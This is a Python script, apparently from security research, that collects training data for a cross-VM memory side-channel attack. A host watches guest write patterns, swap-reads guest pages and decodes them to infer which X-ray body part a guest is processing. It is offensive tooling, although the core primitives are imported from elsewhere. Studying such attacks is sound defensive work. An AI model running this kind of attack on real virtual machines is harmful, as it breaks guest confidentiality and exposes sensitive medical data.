#!/usr/bin/env python3
"""
mura_collect_samples.py -- collect REAL, blind-captured, labeled XOR-slice
training samples for the MURA body-part classifier.

Threat model (why blind): a real attacker (host) does NOT get the guest's
image GPAs. track_input.py's [GPA_PAGE] lines are ground-truth instrumentation
for validation only. Here the host learns WHERE the image is the same way the
live attack does -- write_pattern_tracker WRITE logs -> contiguous 2 MB-block
page runs (mura_block_triage logic) -> swap-read -> dict decode. The only thing
we know (and use as the label) is the CLASS the guest is running, because we
drive run_guest_track.sh with a fixed --study_type. GPA/position/fraction are
all discovered blindly, so the captured slices carry the real attack's noise
(write-track guessing, partial 2 MB fractions, unknown position), which is
exactly the distribution the model must learn from.

Per captured run we build a (64,224,56) slice TOP-ALIGNED (position unknown)
and decode against R/G/B ref patterns (captured fraction may lie in any plane;
match map is channel-agnostic). frac = min(run_len,49)/49.

Freshness: only fixed_gpa must be fresh for the swap mechanism; the 64 ref
BYTE patterns are deterministic (per-channel float32 normalize), so by default
we use computed patterns and re-acquire only fixed_gpa when it ages out. Use
--acquire-refs to inject+swap-read the refs instead (slower, matches the older
persistent-dict path; also subject to ref staleness).

Output: <out-dir>/<LABEL>/<ts>.npy  (float32 (64,224,56))
        <out-dir>/manifest.csv       (one row per saved sample)

Usage (host, sudo; write_pattern_tracker armed to --host-log; guest running
run_guest_track.sh with the SAME class as --label):
  sudo python3 mura_collect_samples.py --label XR_WRIST \
      --host-log /path/to/mura_host_live.log --out-dir real_samples \
      --max-samples 200
"""
import argparse
import csv
import re
import sys
import time
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).parent))
from mura_dict_build import (  # noqa: E402
    REF_U8_64, CHANNELS_ALL, REF_CHUNKS_BY_CH, CHUNK_SIZE, PAGE_SIZE,
    CHUNKS_PAGE, XOR_ROWS, XOR_COLS, IMG_PAGES, SWAP_TOOL, SWAP_PACE_SEC,
    acquire_gpa, do_swap_read, parse_dump,
)

ALIGN_2MB = 0x200000
MIN_RUN, GAP_TOL = 2, 2
KNOWN_NOISE_BLOCKS = {0x120800000, 0xc0000000, 0x3ce6600000}
CLASSES = ["XR_ELBOW", "XR_FINGER", "XR_FOREARM", "XR_HAND",
           "XR_HUMERUS", "XR_SHOULDER", "XR_WRIST"]
_REFIDX = {u8: i for i, u8 in enumerate(REF_U8_64)}


def blk(g: int) -> int:
    return g & ~(ALIGN_2MB - 1)


# ── Reference pattern maps: {channel: {16-byte chunk -> ref index}} ───────────
def build_pattern_maps(channels, acquire_refs, swap_tool, fixed_gpa):
    """Return ({ch: {chunk_bytes: refidx}}, refresh_note)."""
    maps = {ch: {} for ch in channels}
    if not acquire_refs:
        for ch in channels:
            for u8 in REF_U8_64:
                maps[ch][REF_CHUNKS_BY_CH[ch][u8]] = _REFIDX[u8]
        return maps
    # inject + swap-read each (u8, channel) -> use the read-back bytes.
    tmp = Path("mura_collect_ref_tmp.out")
    for ch in channels:
        for i, u8 in enumerate(REF_U8_64):
            gpa = acquire_gpa(u8, chunk_bytes=REF_CHUNKS_BY_CH[ch][u8])
            do_swap_read(fixed_gpa, gpa, tmp, swap_tool)
            rb = parse_dump(tmp)
            for j in range(CHUNKS_PAGE):
                maps[ch][rb[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]] = _REFIDX[u8]
            if (i + 1) % 16 == 0:
                print(f"[refs] {ch}: {i+1}/{len(REF_U8_64)}", flush=True)
    tmp.unlink(missing_ok=True)
    return maps


# ── Decode a blind page run into a top-aligned (64,224,56) slice ─────────────
def decode_run(fixed_gpa, base_gpa, run_len, pat_maps, swap_tool, tmp_dir):
    """swap-read the run (capped at 49 pages = one 224-row plane), match each
    chunk against every channel's ref patterns, return (slice, hit_frac)."""
    n = min(run_len, IMG_PAGES)
    xor_slice = np.zeros((len(REF_U8_64), XOR_ROWS, XOR_COLS), dtype=np.float32)
    tmp = tmp_dir / "collect_page.out"
    channels = list(pat_maps.keys())
    for k in range(n):
        if k > 0 and SWAP_PACE_SEC > 0:
            time.sleep(SWAP_PACE_SEC)
        do_swap_read(fixed_gpa, base_gpa + k * PAGE_SIZE, tmp, swap_tool)
        data = parse_dump(tmp)
        base_flat = k * CHUNKS_PAGE
        for j in range(CHUNKS_PAGE):
            flat = base_flat + j
            if flat >= XOR_ROWS * XOR_COLS:      # beyond one 224-row plane
                break
            chunk = data[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]
            for ch in channels:
                ri = pat_maps[ch].get(chunk)
                if ri is not None:
                    xor_slice[ri, flat // XOR_COLS, flat % XOR_COLS] = 1.0
                    break
    hit_frac = float(xor_slice.sum()) / (n * CHUNKS_PAGE)
    return xor_slice, hit_frac


# ── Contiguous run detection over a write-tracker WRITE log (tail -f) ─────────
def tail_f(path, from_start=False):
    """Follow a live log (default). With from_start=True the log is treated as
    a finite offline capture: read from the beginning and STOP at EOF (so
    replaying a saved WRITE log terminates instead of blocking forever)."""
    with open(path, errors="ignore") as f:
        if from_start:
            for line in f:
                yield line
            return
        f.seek(0, 2)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.05)
                continue
            yield line


_WRITE_RE = re.compile(r'WRITE\s+gpa=0x([0-9a-f]+)\s+ts=(\d+)', re.I)


def run_events(lines, min_run, idle_flush=2.0):
    """Yield (base, length, block) ONCE per contiguous run, at its maximal
    extent -- when the run is broken by a non-contiguous WRITE (or the log
    goes idle for `idle_flush` seconds on a live tail). One physical image run
    => one capture at its true captured fraction, not one per growth step."""
    base = length = 0
    last_line_t = time.time()
    for line in lines:
        m = _WRITE_RE.match(line.strip())
        if not m:
            # tail_f yields only real lines; a None here (idle) never occurs,
            # but keep the idle-flush hook for callers that inject sentinels.
            if line == "" and length >= min_run and time.time() - last_line_t > idle_flush:
                yield base, length, blk(base); base = length = 0
            continue
        last_line_t = time.time()
        gpa = int(m.group(1), 16)
        if length == 0:
            base, length = gpa, 1
            continue
        expected = base + length * PAGE_SIZE
        if gpa == expected:
            length += 1
        elif gpa > expected and (gpa - expected) // PAGE_SIZE <= GAP_TOL:
            length += (gpa - expected) // PAGE_SIZE + 1
        else:
            # run broken -> emit the completed run, start a new one
            if length >= min_run:
                yield base, length, blk(base)
            base, length = gpa, 1
    if length >= min_run:                     # flush final run at log end
        yield base, length, blk(base)


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--label", required=True, choices=CLASSES,
                    help="class the guest is running (study_type) = sample label")
    ap.add_argument("--host-log", required=True,
                    help="write_pattern_tracker WRITE log (armed/running)")
    ap.add_argument("--out-dir", default="real_samples")
    ap.add_argument("--channels", default="RGB")
    ap.add_argument("--acquire-refs", action="store_true",
                    help="inject+swap-read refs instead of computed patterns")
    ap.add_argument("--min-run", type=int, default=8,
                    help="min contiguous pages to treat a run as image content")
    ap.add_argument("--min-hitrate", type=float, default=0.05,
                    help="drop captures below this chunk match rate (noise)")
    ap.add_argument("--dict-max-age", type=float, default=900.0,
                    help="re-acquire fixed_gpa after this many seconds")
    ap.add_argument("--max-samples", type=int, default=200)
    ap.add_argument("--swap-tool", default=str(SWAP_TOOL))
    ap.add_argument("--from-start", action="store_true",
                    help="read host-log from the beginning (offline log)")
    args = ap.parse_args()

    channels = [c for c in CHANNELS_ALL if c in args.channels.upper()] or ["R"]
    out_dir = Path(args.out_dir)
    (out_dir / args.label).mkdir(parents=True, exist_ok=True)
    manifest = out_dir / "manifest.csv"
    new_manifest = not manifest.exists()
    mf = open(manifest, "a", newline="")
    mw = csv.writer(mf)
    if new_manifest:
        mw.writerow(["file", "label", "block", "base", "run_len", "frac",
                     "hitrate", "channels", "ts"])

    tmp_dir = out_dir / ".tmp"; tmp_dir.mkdir(exist_ok=True)
    print(f"[collect] label={args.label} channels={channels} "
          f"min_run={args.min_run} out={out_dir}", flush=True)

    def fresh():
        print("[collect] acquiring fresh fixed_gpa...", flush=True)
        fg = acquire_gpa(None)
        print(f"[collect] fixed_gpa=0x{fg:x}", flush=True)
        pm = build_pattern_maps(channels, args.acquire_refs, args.swap_tool, fg)
        return fg, pm, time.time()

    fixed_gpa, pat_maps, dict_t0 = fresh()

    saved = 0
    for base, length, block in run_events(
            tail_f(Path(args.host_log), args.from_start), args.min_run):
        if block in KNOWN_NOISE_BLOCKS:
            continue
        if time.time() - dict_t0 > args.dict_max_age:
            print("[collect] dict aged out -> refreshing", flush=True)
            fixed_gpa, pat_maps, dict_t0 = fresh()
        try:
            sl, hr = decode_run(fixed_gpa, base, length, pat_maps,
                                args.swap_tool, tmp_dir)
        except Exception as e:
            print(f"[!] capture failed at 0x{base:x}: {e}", file=sys.stderr)
            continue
        if hr < args.min_hitrate:
            print(f"  block=0x{block:x} base=0x{base:x} {length}p "
                  f"hitrate={hr*100:.1f}% < {args.min_hitrate*100:.0f}% -> skip",
                  flush=True)
            continue
        ts = time.time_ns()
        frac = min(length, IMG_PAGES) / IMG_PAGES
        fpath = out_dir / args.label / f"{ts}.npy"
        np.save(fpath, sl)
        mw.writerow([fpath.name, args.label, hex(block), hex(base), length,
                     f"{frac:.4f}", f"{hr:.4f}", "".join(channels), ts])
        mf.flush()
        saved += 1
        print(f"  [{saved}/{args.max_samples}] SAVED {fpath.name} "
              f"base=0x{base:x} {length}p frac={frac:.2f} hitrate={hr*100:.1f}%",
              flush=True)
        if saved >= args.max_samples:
            break

    mf.close()
    print(f"[collect] done. {saved} samples -> {out_dir}/{args.label}", flush=True)


if __name__ == "__main__":
    main()
